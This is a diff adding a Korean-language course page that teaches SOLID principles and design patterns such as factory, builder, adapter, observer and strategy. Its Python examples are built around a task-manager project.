@@ -1,0 +1,2601 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="페이즈 7: 엔지니어링 기술 — 디자인 패턴, SQL 마스터, 트랜잭션, 네트워킹, 동시성, 보안 엔지니어링. 28~33장.">
+<title>페이즈 7: 엔지니어링 기술 — 제로 투 히어로</title>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&amp;family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&amp;family=JetBrains+Mono:wght@400;500&family=Noto+Sans+KR:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/design-system.css">
+<script>try{if(localStorage.getItem('zth-theme')==='light')document.documentElement.setAttribute('data-theme','light')}catch(e){}</script>
+<script>try{var z=localStorage.getItem('zth-zoom');if(z&&+z>=50&&+z<=200)document.documentElement.style.zoom=+z/100}catch(e){}</script>
+</head>
+<body>
+
+<svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0"><defs>
+<marker id="arrowhead" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="var(--accent)"/></marker>
+<marker id="arrowhead-muted" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="var(--a5)"/></marker>
+</defs></svg>
+
+<button class="hamburger" id="hamburger"><span></span><span></span><span></span></button>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<button class="toggle" id="themeToggle" aria-label="Toggle theme">
+<svg class="is" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="im" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+</button>
+
+<aside class="sidebar" id="sidebar">
+<aside class="sidebar" id="sidebar">
+  <a href="index.html" class="sidebar-logo"><span>제로 투 히어로</span>프로그래밍 &rarr; 멀티 에이전트 AI</a>
+  <div class="toc-group">
+    <div class="toc-group-title">기초</div>
+    <a href="phase-1.html#ch01" class="toc-link"><span class="toc-num">01</span>프로그래밍이란 무엇인가</a>
+    <a href="phase-1.html#ch02" class="toc-link"><span class="toc-num">02</span>컴퓨터가 코드를 실행하는 방법</a>
+    <a href="phase-1.html#ch03" class="toc-link"><span class="toc-num">03</span>환경 설정하기</a>
+    <a href="phase-1.html#ch04" class="toc-link"><span class="toc-num">04</span>쓰기 전에 코드 읽기</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Python</div>
+    <a href="phase-2.html#ch05" class="toc-link"><span class="toc-num">05</span>함수, 논리, 제어 흐름</a>
+    <a href="phase-2.html#ch06" class="toc-link"><span class="toc-num">06</span>자료 구조</a>
+    <a href="phase-2.html#ch07" class="toc-link"><span class="toc-num">07</span>클래스와 객체 지향 프로그래밍</a>
+    <a href="phase-2.html#ch08" class="toc-link"><span class="toc-num">08</span>파일, 모듈, 표준 라이브러리</a>
+    <a href="phase-2.html#ch09" class="toc-link"><span class="toc-num">09</span>에러 처리, 디버깅, 테스트</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">개발 도구</div>
+    <a href="phase-3.html#ch10" class="toc-link"><span class="toc-num">10</span>터미널과 셸</a>
+    <a href="phase-3.html#ch11" class="toc-link"><span class="toc-num">11</span>Git 기초</a>
+    <a href="phase-3.html#ch12" class="toc-link"><span class="toc-num">12</span>Git 원격 저장소와 GitHub</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">구축과 배포</div>
+    <a href="phase-4.html#ch13" class="toc-link"><span class="toc-num">13</span>API와 HTTP</a>
+    <a href="phase-4.html#ch14" class="toc-link"><span class="toc-num">14</span>Flask로 API 구축하기</a>
+    <a href="phase-4.html#ch15" class="toc-link"><span class="toc-num">15</span>데이터베이스 기초</a>
+    <a href="phase-4.html#ch16" class="toc-link"><span class="toc-num">16</span>Docker와 컨테이너</a>
+    <a href="phase-4.html#ch17" class="toc-link"><span class="toc-num">17</span>CI/CD와 GitHub Actions</a>
+    <a href="phase-4.html#ch18" class="toc-link"><span class="toc-num">18</span>프로젝트 아키텍처</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">자료 구조</div>
+    <a href="phase-5.html#ch19" class="toc-link"><span class="toc-num">19</span>복잡도 분석</a>
+    <a href="phase-5.html#ch20" class="toc-link"><span class="toc-num">20</span>선형 구조</a>
+    <a href="phase-5.html#ch21" class="toc-link"><span class="toc-num">21</span>해시 테이블과 맵</a>
+    <a href="phase-5.html#ch22" class="toc-link"><span class="toc-num">22</span>트리</a>
+    <a href="phase-5.html#ch23" class="toc-link"><span class="toc-num">23</span>그래프</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">알고리즘</div>
+    <a href="phase-6.html#ch24" class="toc-link"><span class="toc-num">24</span>탐색과 정렬</a>
+    <a href="phase-6.html#ch25" class="toc-link"><span class="toc-num">25</span>재귀와 동적 프로그래밍</a>
+    <a href="phase-6.html#ch26" class="toc-link"><span class="toc-num">26</span>알고리즘 패턴</a>
+    <a href="phase-6.html#ch27" class="toc-link"><span class="toc-num">27</span>그래프 알고리즘</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">엔지니어링 기술</div>
+    <a href="phase-7.html#ch28" class="toc-link"><span class="toc-num">28</span>디자인 패턴과 SOLID</a>
+    <a href="phase-7.html#ch29" class="toc-link"><span class="toc-num">29</span>SQL과 쿼리 마스터</a>
+    <a href="phase-7.html#ch30" class="toc-link"><span class="toc-num">30</span>트랜잭션과 NoSQL</a>
+    <a href="phase-7.html#ch31" class="toc-link"><span class="toc-num">31</span>네트워킹과 인터넷</a>
+    <a href="phase-7.html#ch32" class="toc-link"><span class="toc-num">32</span>동시성과 병렬 처리</a>
+    <a href="phase-7.html#ch33" class="toc-link"><span class="toc-num">33</span>보안 엔지니어링</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">시스템과 확장</div>
+    <a href="phase-8.html#ch34" class="toc-link"><span class="toc-num">34</span>시스템 설계</a>
+    <a href="phase-8.html#ch35" class="toc-link"><span class="toc-num">35</span>분산 시스템</a>
+    <a href="phase-8.html#ch36" class="toc-link"><span class="toc-num">36</span>성능과 관측 가능성</a>
+    <a href="phase-8.html#ch37" class="toc-link"><span class="toc-num">37</span>대규모 코드베이스 탐색</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">AI 레벨 1~5</div>
+    <a href="phase-9.html#ch38" class="toc-link"><span class="toc-num">38</span>AI 코드 평가와 지시</a>
+    <a href="phase-9.html#ch39" class="toc-link"><span class="toc-num">39</span>레벨 1&amp;2 — 탭 자동완성과 에이전트 IDE</a>
+    <a href="phase-9.html#ch40" class="toc-link"><span class="toc-num">40</span>레벨 3 — 컨텍스트 엔지니어링</a>
+    <a href="phase-9.html#ch41" class="toc-link"><span class="toc-num">41</span>레벨 4 — 복합 엔지니어링</a>
+    <a href="phase-9.html#ch42" class="toc-link"><span class="toc-num">42</span>레벨 5 — MCP, 스킬, 기능</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">AI 레벨 6~8</div>
+    <a href="phase-10.html#ch43" class="toc-link"><span class="toc-num">43</span>레벨 6 — 하네스 엔지니어링</a>
+    <a href="phase-10.html#ch44" class="toc-link"><span class="toc-num">44</span>레벨 7 — 백그라운드 에이전트</a>
+    <a href="phase-10.html#ch45" class="toc-link"><span class="toc-num">45</span>Docker에서의 Claude Code</a>
+    <a href="phase-10.html#ch46" class="toc-link"><span class="toc-num">46</span>레벨 8 — 자율 에이전트 팀</a>
+    <a href="phase-10.html#ch47" class="toc-link"><span class="toc-num">47</span>멀티플레이어 효과</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">참고 자료</div>
+    <a href="appendices.html#glossary" class="toc-link"><span class="toc-num">&oplus;</span>용어집</a>
+    <a href="appendices.html#prompt-library" class="toc-link"><span class="toc-num">&oplus;</span>프롬프트 라이브러리</a>
+    <a href="appendices.html#self-assessment" class="toc-link"><span class="toc-num">&oplus;</span>자기 평가</a>
+    <a href="appendices.html#common-mistakes" class="toc-link"><span class="toc-num">&oplus;</span>흔한 실수</a>
+    <a href="appendices.html#appendix-d" class="toc-link"><span class="toc-num">&oplus;</span>문제 해결</a>
+    <a href="appendices.html#appendix-e" class="toc-link"><span class="toc-num">&oplus;</span>리소스</a>
+  </div>
+</aside>
+</aside>
+
+<div class="main">
+<section class="hero hero-sm">
+  <div class="hero-badge">페이즈 7 &mdash; 엔지니어링 기술</div>
+  <h1>엔지니어링 <em>기술</em></h1>
+  <p class="hero-sub">디자인 패턴, 데이터베이스 마스터, 네트워킹, 동시성, 보안. 코드를 작성할 수 있는 사람과 시스템을 구축할 수 있는 사람을 가르는 기술입니다.</p>
+  <div class="hero-meta"><span>28~33장</span><span>페이즈 게이트 + TaskForge</span></div>
+</section>
+<div class="content-wrap">
+
+<div role="note" class="callout info">
+<div class="callout-title">페이즈 7 시작 전</div>
+<p>이 페이즈는 다음을 할 수 있다고 가정합니다: 알고리즘 복잡도 분석(19장), 자료 구조 구현(20~23장), 알고리즘 패턴 적용(24~27장), Flask API와 SQLite 구축(14~15장). 이 중 자신 없는 부분이 있다면 해당 장을 먼저 복습하십시오.</p>
+</div>
+
+
+<!-- ===== CH 28 ===== -->
+<section id="ch28" data-ch="28">
+<h2><span class="ch-label">Chapter 28</span> 디자인 패턴과 클린 아키텍처</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">지금 이것이 중요한 이유</div>
+<p>작동하는 코드는 작성할 수 있습니다. 그런데 요구 사항이 바뀌어도 <em>계속</em> 작동하는 코드를 작성할 수 있습니까? 디자인 패턴(design pattern)과 SOLID 원칙은 수십 년간의 소프트웨어 엔지니어링이 쌓아 온 집단적 지혜입니다. 반복되는 문제에 대한 검증된 해결책이며, 코드베이스가 우아하게 성장하느냐 자체 무게에 무너지느냐를 가르는 차이입니다. 이 장에서는 가장 중요한 패턴을 인식하고, 언제 적용할지 이해하며, 그만큼 중요한 언제 <em>적용하지 말아야</em> 하는지도 배웁니다.</p>
+</div>
+
+<h3>SOLID 원칙</h3>
+
+<p><strong>SOLID</strong>는 객체 지향 설계를 안내하는 다섯 가지 원칙의 약어입니다. Robert C. Martin이 정리하여 명명했으며, 유지 보수 가능한 소프트웨어의 근간을 이룹니다. Python 코드로 작성된 실제 위반 사례와 수정 방법을 함께 살펴보겠습니다.</p>
+
+<h4>S &mdash; 단일 책임 원칙 (Single Responsibility Principle, SRP)</h4>
+
+<p>클래스는 <em>변경 이유가 하나</em>여야 합니다. 비즈니스 로직과 파일 I/O를 동시에 처리하는 클래스는 두 가지 독립적인 변경 이유를 갖게 됩니다.</p>
+
+<p><strong>위반 사례:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskManager:
+    """Handles tasks AND writes reports AND sends emails."""
+    def __init__(self):
+        self.tasks = []
+
+    def add_task(self, title, priority):
+        self.tasks.append({"title": title, "priority": priority})
+
+    def generate_report(self):
+        html = "&lt;h1&gt;Task Report&lt;/h1&gt;"
+        for t in self.tasks:
+            html += f"&lt;p&gt;{t['title']} - {t['priority']}&lt;/p&gt;"
+        return html
+
+    def send_email(self, to_address, body):
+        import smtplib
+        server = smtplib.SMTP("mail.example.com")
+        server.sendmail("tasks@example.com", to_address, body)
+        server.quit()</code></pre>
+
+<p>이 클래스는 변경 이유가 세 가지입니다: 태스크 로직, 보고서 형식, 이메일 전송. SMTP에서 이메일 API로 전환하면 태스크 관리를 담당하는 파일을 수정해야 합니다.</p>
+
+<p><strong>수정 &mdash; 역할별 클래스 분리:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskManager:
+    """Only manages tasks."""
+    def __init__(self):
+        self.tasks = []
+
+    def add_task(self, title, priority):
+        self.tasks.append({"title": title, "priority": priority})
+
+    def get_tasks(self):
+        return list(self.tasks)
+
+
+class TaskReporter:
+    """Only generates reports from task data."""
+    def generate_html(self, tasks):
+        html = "&lt;h1&gt;Task Report&lt;/h1&gt;"
+        for t in tasks:
+            html += f"&lt;p&gt;{t['title']} - {t['priority']}&lt;/p&gt;"
+        return html
+
+
+class EmailSender:
+    """Only sends emails."""
+    def send(self, to_address, body):
+        import smtplib
+        server = smtplib.SMTP("mail.example.com")
+        server.sendmail("tasks@example.com", to_address, body)
+        server.quit()</code></pre>
+
+<p>이제 각 클래스는 변경 이유가 정확히 하나입니다. 태스크 로직에 손대지 않고도 이메일 발신자를 교체할 수 있습니다.</p>
+
+<h4>O &mdash; 개방/폐쇄 원칙 (Open/Closed Principle, OCP)</h4>
+
+<p>소프트웨어 개체는 <em>확장에는 열려 있고 수정에는 닫혀 있어야</em> 합니다. 기존 코드를 재작성하지 않고 새로운 동작을 추가할 수 있어야 합니다.</p>
+
+<p><strong>위반 사례:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskExporter:
+    def export(self, tasks, format_type):
+        if format_type == "json":
+            import json
+            return json.dumps(tasks)
+        elif format_type == "csv":
+            lines = ["title,priority"]
+            for t in tasks:
+                lines.append(f"{t['title']},{t['priority']}")
+            return "\n".join(lines)
+        # Every new format requires editing THIS method</code></pre>
+
+<p>XML 내보내기를 추가하려면 기존 <code>export</code> 메서드를 수정해야 하는데, 이는 OCP를 위반합니다.</p>
+
+<p><strong>수정 &mdash; 다형성(polymorphism) 활용:</strong></p>
+<pre style="overflow-x:auto"><code>from abc import ABC, abstractmethod
+
+class Exporter(ABC):
+    @abstractmethod
+    def export(self, tasks): pass
+
+class JsonExporter(Exporter):
+    def export(self, tasks):
+        import json
+        return json.dumps(tasks)
+
+class CsvExporter(Exporter):
+    def export(self, tasks):
+        lines = ["title,priority"]
+        for t in tasks:
+            lines.append(f"{t['title']},{t['priority']}")
+        return "\n".join(lines)
+
+# Adding XML? Create a new class. Zero existing code changes.
+class XmlExporter(Exporter):
+    def export(self, tasks):
+        xml = "&lt;tasks&gt;"
+        for t in tasks:
+            xml += f"&lt;task&gt;&lt;title&gt;{t['title']}&lt;/title&gt;&lt;/task&gt;"
+        xml += "&lt;/tasks&gt;"
+        return xml</code></pre>
+
+<h4>L &mdash; 리스코프 치환 원칙 (Liskov Substitution Principle, LSP)</h4>
+
+<p>하위 타입은 정확성을 해치지 않고 부모 타입이 필요한 곳 어디서나 사용할 수 있어야 합니다. <code>Bird</code>를 받는 함수에 <code>Penguin</code>을 넘겼을 때 <code>Penguin.fly()</code>가 예외를 발생시켜서 충돌이 나면 안 됩니다.</p>
+
+<p><strong>위반 사례:</strong></p>
+<pre style="overflow-x:auto"><code>class Rectangle:
+    def __init__(self, width, height):
+        self.width = width
+        self.height = height
+
+    def area(self):
+        return self.width * self.height
+
+class Square(Rectangle):
+    def __init__(self, side):
+        super().__init__(side, side)
+
+    def set_width(self, w):
+        self.width = w
+        self.height = w  # Silently changes height too!</code></pre>
+
+<p><code>rect.set_width(5)</code>를 호출한 후 <code>rect.height</code>가 변하지 않기를 기대하는 코드는 Square에서 오작동합니다. 수정 방법: Square가 Rectangle을 상속하지 않게 하고, 공유 <code>Shape</code> 인터페이스를 사용합니다.</p>
+
+<h4>I &mdash; 인터페이스 분리 원칙 (Interface Segregation Principle, ISP)</h4>
+
+<p>클라이언트는 사용하지 않는 메서드에 의존하도록 강요받아서는 안 됩니다. 메서드가 20개인 비대한 인터페이스는 모든 구현자가 사용하지 않는 메서드를 빈 구현으로 채우게 만듭니다.</p>
+
+<p><strong>위반 사례:</strong></p>
+<pre style="overflow-x:auto"><code>class Worker(ABC):
+    @abstractmethod
+    def code(self): pass
+
+    @abstractmethod
+    def test(self): pass
+
+    @abstractmethod
+    def manage_team(self): pass  # Not all workers manage!
+
+class JuniorDev(Worker):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+    def manage_team(self):
+        raise NotImplementedError("Juniors don't manage!")</code></pre>
+
+<p><strong>수정 &mdash; 역할별 인터페이스 분리:</strong></p>
+<pre style="overflow-x:auto"><code>class Coder(ABC):
+    @abstractmethod
+    def code(self): pass
+
+class Tester(ABC):
+    @abstractmethod
+    def test(self): pass
+
+class Manager(ABC):
+    @abstractmethod
+    def manage_team(self): pass
+
+class JuniorDev(Coder, Tester):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+
+class TechLead(Coder, Tester, Manager):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+    def manage_team(self): return "Leading the team"</code></pre>
+
+<h4>D &mdash; 의존성 역전 원칙 (Dependency Inversion Principle, DIP)</h4>
+
+<p>고수준 모듈은 저수준 모듈에 의존해서는 안 됩니다. 둘 다 <strong>추상화(abstraction)</strong>에 의존해야 합니다.</p>
+
+<p><strong>위반 사례:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskService:
+    def __init__(self):
+        self.db = SQLiteDatabase("tasks.db")  # Hard-wired!
+
+    def get_all_tasks(self):
+        return self.db.query("SELECT * FROM tasks")</code></pre>
+
+<p>실제 파일 없이는 데이터베이스를 교체하거나 테스트할 수 없습니다. <strong>수정 &mdash; 추상화에 의존하기:</strong></p>
+<pre style="overflow-x:auto"><code>class Database(ABC):
+    @abstractmethod
+    def query(self, sql): pass
+
+class TaskService:
+    def __init__(self, db: Database):
+        self.db = db  # Injected from outside
+
+    def get_all_tasks(self):
+        return self.db.query("SELECT * FROM tasks")
+
+# Production:
+service = TaskService(SQLiteDatabase("tasks.db"))
+# Testing:
+test_service = TaskService(InMemoryDatabase())</code></pre>
+
+<h3>생성 패턴 (Creational Patterns)</h3>
+
+<p>생성 패턴은 객체를 <em>어떻게</em> 만드는지를 추상화하여 호출 코드가 구체적으로 어떤 클래스가 인스턴스화되는지 알 필요가 없게 합니다.</p>
+
+<h4>팩토리 패턴 (Factory Pattern)</h4>
+
+<p><strong>팩토리(Factory)</strong>는 생성 로직을 노출하지 않고 객체를 만듭니다. 생성자를 직접 호출하는 대신, 입력에 따라 알맞은 객체를 반환하는 팩토리 함수를 호출합니다.</p>
+
+<pre style="overflow-x:auto"><code>class Task:
+    def __init__(self, title, priority="medium"):
+        self.title = title
+        self.priority = priority
+
+class Bug(Task):
+    def __init__(self, title, severity="normal"):
+        super().__init__(title, priority="high")
+        self.severity = severity
+
+class Feature(Task):
+    def __init__(self, title, story_points=1):
+        super().__init__(title, priority="medium")
+        self.story_points = story_points
+
+def create_task(task_type, title, **kwargs):
+    """Factory function: caller doesn't know which class is used."""
+    factories = {
+        "bug": Bug,
+        "feature": Feature,
+        "task": Task,
+    }
+    cls = factories.get(task_type)
+    if cls is None:
+        raise ValueError(f"Unknown task type: {task_type}")
+    return cls(title, **kwargs)
+
+# Usage &mdash; caller never imports Bug or Feature directly
+item = create_task("bug", "Login page crashes", severity="critical")
+print(type(item).__name__)  # Bug</code></pre>
+
+<h4>빌더 패턴 (Builder Pattern)</h4>
+
+<p>선택적 매개변수가 많이 필요한 생성 과정에서 <strong>빌더(Builder)</strong> 패턴은 인수 15개짜리 생성자 대신 읽기 쉽고 단계적인 인터페이스를 제공합니다.</p>
+
+<pre style="overflow-x:auto"><code>class TaskBuilder:
+    def __init__(self, title):
+        self._title = title
+        self._priority = "medium"
+        self._assignee = None
+        self._labels = []
+        self._due_date = None
+
+    def priority(self, p):
+        self._priority = p
+        return self  # Enable chaining
+
+    def assign_to(self, name):
+        self._assignee = name
+        return self
+
+    def label(self, lbl):
+        self._labels.append(lbl)
+        return self
+
+    def due(self, date):
+        self._due_date = date
+        return self
+
+    def build(self):
+        return {
+            "title": self._title,
+            "priority": self._priority,
+            "assignee": self._assignee,
+            "labels": self._labels,
+            "due_date": self._due_date,
+        }
+
+# Clean, readable construction
+task = (TaskBuilder("Fix login bug")
+        .priority("high")
+        .assign_to("Alice")
+        .label("security")
+        .label("urgent")
+        .due("2026-04-01")
+        .build())</code></pre>
+
+<h4>싱글턴 (Singleton) — 그리고 대부분 잘못된 이유</h4>
+
+<p><strong>싱글턴(Singleton)</strong>은 클래스의 인스턴스가 전역적으로 하나만 존재하도록 보장합니다.</p>
+
+<pre style="overflow-x:auto"><code>class ConfigManager:
+    _instance = None
+
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance.settings = {}
+        return cls._instance
+
+a = ConfigManager()
+b = ConfigManager()
+assert a is b  # True &mdash; same object</code></pre>
+
+<div role="note" class="callout warn">
+<div class="callout-title">주의: 싱글턴은 상태 공유의 좋은 방법이 아닙니다</div>
+<p>싱글턴은 전역 상태를 위장한 것에 불과합니다. 모든 테스트가 동일한 변경 가능한 인스턴스를 공유하기 때문에 테스트를 매우 어렵게 만듭니다. 또한 숨겨진 의존성을 만들어, 함수 시그니처에 나타나지 않고도 어떤 코드든 싱글턴에 접근할 수 있게 됩니다. 대신 의존성 주입(dependency injection)을 사용하십시오: 최상위에서 인스턴스를 하나 만들고 필요한 모든 곳에 전달합니다.</p>
+</div>
+
+<h3>구조 패턴 (Structural Patterns)</h3>
+
+<h4>어댑터 패턴 (Adapter Pattern)</h4>
+
+<p><strong>어댑터(Adapter)</strong>는 호환되지 않는 인터페이스를 코드가 기대하는 형태로 맞춰 줍니다. TaskForge가 <code>save()</code>와 <code>load()</code>를 기대하는데 서드파티 라이브러리는 <code>write_data()</code>와 <code>read_data()</code>를 사용하는 경우를 상상해 보십시오.</p>
+
+<pre style="overflow-x:auto"><code>class ThirdPartyStorage:
+    """We cannot modify this class."""
+    def write_data(self, key, value):
+        print(f"Writing {key}: {value}")
+
+    def read_data(self, key):
+        return {"title": "Example task"}
+
+class StorageAdapter:
+    """Makes ThirdPartyStorage look like our interface."""
+    def __init__(self, adaptee):
+        self._adaptee = adaptee
+
+    def save(self, key, value):
+        return self._adaptee.write_data(key, value)
+
+    def load(self, key):
+        return self._adaptee.read_data(key)
+
+# TaskForge code works without changes
+storage = StorageAdapter(ThirdPartyStorage())
+storage.save("task-1", {"title": "Buy groceries"})</code></pre>
+
+<h4>데코레이터 패턴 (Decorator Pattern)</h4>
+
+<p><strong>데코레이터(Decorator)</strong> 패턴은 클래스를 수정하지 않고 객체에 동작을 추가합니다. Python은 함수 데코레이터를 언어 차원에서 지원하지만, OOP 버전은 동일한 인터페이스를 가진 객체를 다른 객체로 감쌉니다.</p>
+
+<pre style="overflow-x:auto"><code>class TaskService:
+    def get_task(self, task_id):
+        return {"id": task_id, "title": "Fix bug"}
+
+class LoggingTaskService:
+    """Adds logging around every call."""
+    def __init__(self, wrapped):
+        self._wrapped = wrapped
+
+    def get_task(self, task_id):
+        print(f"[LOG] Getting task {task_id}")
+        result = self._wrapped.get_task(task_id)
+        print(f"[LOG] Found: {result['title']}")
+        return result
+
+class CachingTaskService:
+    """Adds caching."""
+    def __init__(self, wrapped):
+        self._wrapped = wrapped
+        self._cache = {}
+
+    def get_task(self, task_id):
+        if task_id not in self._cache:
+            self._cache[task_id] = self._wrapped.get_task(task_id)
+        return self._cache[task_id]
+
+# Stack decorators: logging around caching around real service
+service = LoggingTaskService(CachingTaskService(TaskService()))</code></pre>
+
+<h4>퍼사드 패턴 (Facade Pattern)</h4>
+
+<p><strong>퍼사드(Facade)</strong>는 복잡한 서브시스템에 단순화된 인터페이스를 제공합니다. 호출자가 열 개의 클래스와 상호 작용하도록 강요하는 대신, 몇 가지 명확한 메서드를 가진 하나의 클래스를 제공합니다.</p>
+
+<pre style="overflow-x:auto"><code>class TaskForge:
+    """Facade: one entry point for the entire system."""
+    def __init__(self, db, auth, notifier, logger):
+        self._db = db
+        self._auth = auth
+        self._notifier = notifier
+        self._logger = logger
+
+    def create_task(self, user_token, title, priority):
+        user = self._auth.verify(user_token)
+        task = self._db.insert_task(title, priority, user.id)
+        self._notifier.notify_team(f"New task: {title}")
+        self._logger.log("task_created", task.id, user.id)
+        return task</code></pre>
+
+<h3>행위 패턴 (Behavioural Patterns)</h3>
+
+<h4>옵서버 패턴 (Observer Pattern) — Pub/Sub</h4>
+
+<p><strong>옵서버(Observer)</strong> 패턴은 객체가 이벤트를 구독할 수 있게 합니다. 무언가가 발생하면 모든 구독자에게 자동으로 알림이 전달되어, 이벤트 소스와 핸들러가 분리됩니다.</p>
+
+<pre style="overflow-x:auto"><code>class EventBus:
+    def __init__(self):
+        self._listeners = {}
+
+    def subscribe(self, event_type, callback):
+        self._listeners.setdefault(event_type, []).append(callback)
+
+    def publish(self, event_type, data):
+        for callback in self._listeners.get(event_type, []):
+            callback(data)
+
+bus = EventBus()
+
+def send_email(task):
+    print(f"Email: New task '{task['title']}' created")
+
+def update_dashboard(task):
+    print(f"Dashboard: Refreshing with new task")
+
+bus.subscribe("task_created", send_email)
+bus.subscribe("task_created", update_dashboard)
+
+# When a task is created, both handlers fire automatically
+bus.publish("task_created", {"title": "Fix login bug", "priority": "high"})</code></pre>
+
+<h4>전략 패턴 (Strategy Pattern)</h4>
+
+<p><strong>전략(Strategy)</strong> 패턴은 교환 가능한 알고리즘(algorithm) 군을 정의합니다. 클라이언트는 런타임에 사용할 알고리즘을 선택합니다. 이것이 TaskForge 스토리지 백엔드에 사용할 패턴입니다.</p>
+
+<!-- Strategy Pattern SVG Diagram -->
+<svg viewBox="0 0 700 340" aria-label="Strategy pattern diagram showing TaskManager using a StorageBackend interface with three implementations: SQLiteBackend, JsonFileBackend, and InMemoryBackend" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <!-- TaskManager box -->
+  <rect x="250" y="10" width="200" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="35" class="label-text" text-anchor="middle" font-size="15" font-weight="600">TaskManager</text>
+  <text x="350" y="55" class="sub-text" text-anchor="middle" font-size="11">uses storage.save() / .load()</text>
+
+  <!-- Arrow down to interface -->
+  <line x1="350" y1="70" x2="350" y2="118" class="arrow" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowhead)"/>
+  <text x="370" y="100" class="sub-text" font-size="10">depends on</text>
+
+  <!-- StorageBackend interface -->
+  <rect x="220" y="120" width="260" height="60" rx="8" class="node-accent" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6,3"/>
+  <text x="350" y="145" class="label-text" text-anchor="middle" font-size="13" font-style="italic">&laquo;interface&raquo;</text>
+  <text x="350" y="165" class="label-text" text-anchor="middle" font-size="14" font-weight="600">StorageBackend</text>
+
+  <!-- Three implementations -->
+  <rect x="20" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="110" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">SQLiteBackend</text>
+  <text x="110" y="305" class="sub-text" text-anchor="middle" font-size="10">tasks.db file</text>
+
+  <rect x="260" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">JsonFileBackend</text>
+  <text x="350" y="305" class="sub-text" text-anchor="middle" font-size="10">tasks.json file</text>
+
+  <rect x="500" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="590" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">InMemoryBackend</text>
+  <text x="590" y="305" class="sub-text" text-anchor="middle" font-size="10">dict in RAM (testing)</text>
+
+  <!-- Dashed arrows from implementations up to interface -->
+  <line x1="110" y1="260" x2="295" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <line x1="350" y1="260" x2="350" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <line x1="590" y1="260" x2="405" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+
+  <text x="80" y="230" class="sub-text" font-size="10">implements</text>
+  <text x="350" y="230" class="sub-text" text-anchor="middle" font-size="10">implements</text>
+  <text x="560" y="230" class="sub-text" font-size="10">implements</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>from abc import ABC, abstractmethod
+
+class StorageBackend(ABC):
+    @abstractmethod
+    def save(self, task_id, task_data):
+        """Persist a task."""
+        pass
+
+    @abstractmethod
+    def load(self, task_id):
+        """Retrieve a task by ID, or None."""
+        pass
+
+    @abstractmethod
+    def list_all(self):
+        """Return all stored tasks."""
+        pass
+
+class InMemoryBackend(StorageBackend):
+    def __init__(self):
+        self._store = {}
+
+    def save(self, task_id, task_data):
+        self._store[task_id] = task_data
+
+    def load(self, task_id):
+        return self._store.get(task_id)
+
+    def list_all(self):
+        return list(self._store.values())
+
+class TaskManager:
+    def __init__(self, backend: StorageBackend):
+        self._backend = backend
+
+    def add_task(self, task_id, title, priority="medium"):
+        self._backend.save(task_id, {"title": title, "priority": priority})
+
+    def get_task(self, task_id):
+        return self._backend.load(task_id)</code></pre>
+
